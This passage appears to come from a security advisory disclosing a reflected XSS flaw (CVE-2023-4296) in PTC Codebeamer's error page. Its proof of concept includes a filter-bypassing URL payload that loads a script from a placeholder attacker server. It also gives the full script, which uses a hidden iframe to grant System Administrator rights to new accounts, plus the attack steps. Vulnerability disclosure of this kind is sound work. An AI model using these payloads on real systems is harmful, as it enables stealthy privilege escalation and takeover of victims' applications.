Business recommendation:
------------------------
SEC Consult recommends PTC customers to install the latest updates.

Furthermore, an in-depth security analysis performed by security professionals
is highly advised, as the software may be affected from other security issues.


Vulnerability overview/description:
-----------------------------------
1) Reflected Cross-Site Scripting (XSS) Vulnerability (CVE-2023-4296)
The dynamic Error Page in Codebeamer is vulnerable to a reflected XSS attack.
It successfully sanitizes malicious HTML tags such as <script> and various
JavaScript events like "onload" or "onerror" that can be used to execute arbitrary
JavaScript code when a certain event occurs.

However, it was possible to bypass these restrictions, allowing an attacker
to inject arbitrary JavaScript code which will be executed in the victim's
browser upon clicking on a malicious link.


Proof of concept:
-----------------
1) Reflected Cross-Site Scripting (XSS) Vulnerability (CVE-2023-4296)
To verify this vulnerability, it is sufficient to open the following URL as
an unauthenticated user in a web browser:
https://<CODEBEAMER_SERVER>/errorHandler.spr?fileName=<html onpointermove = alert(window.origin)>

When a user now moves the cursor anywhere on the Error Page, the
"onpointermove" event triggers, resulting in the execution of the alert()
function.

To further demonstrate the criticality of this vulnerability, the following
XSS payload can be used:

https://<CODEBEAMER_SERVER>/errorHandler.spr?fileName=<html onpointermove =
"if(!document.getElementById('SEC1337')){window.x=document.createElement('script');
window.x.id='SEC1337';window.x.src ='https://<ATTACKER_SERVER>/poc.js';
document.body.appendChild(window.x);}"></html>

Note that the space before the equal sign in "window.x.src ='https://<ATTACKER_SERVER>/poc.js'"
is mandatory, as this section of the payload would otherwise be truncated to
"window.x." by the application, completely removing the URL of the attacker
server.

When an admin user now clicks on this malicious link, an external JavaScript
file will be loaded (poc.js), which can be found below. The included
JavaScript code creates a hidden iframe which loads the page with the User
Registration settings. This page allows to specify, whether newly registered
accounts should get assigned to a certain group via multiple checkboxes to
choose from. The script now automatically selects the checkbox
"System Administrator", resulting in newly registered accounts having admin
privileges in the application. As this attack takes place in a hidden iframe,
the victim doesn't get any visual feedback that the attack is happening.

Attack Sequence:
1. Send the malicious link to an administrator.
2. Wait for the administrator to click on the malicious link.
3. Register a new account with automatic admin privileges.

Content of poc.js:
frame = document.createElement("iframe");
frame.addEventListener("load", function() {
     setTimeout(function(){
             frame.contentDocument.getElementById("roles1").click();
             frame.contentDocument.getElementById("notificationFrom").value = "example@...-consult.com";
             frame.contentDocument.getElementById("notificationAddress").value = "example@...-consult.com";
             frame.contentDocument.getElementsByClassName("actionBar")[0].childNodes[1].click();
     }, 2000)
});
frame.src = "http://<CODEBEAMER_SERVER>/sysadmin/configUserRegistration.spr";
frame.style="position: absolute;width:0;height:0;border:0;";
document.body.append(frame);
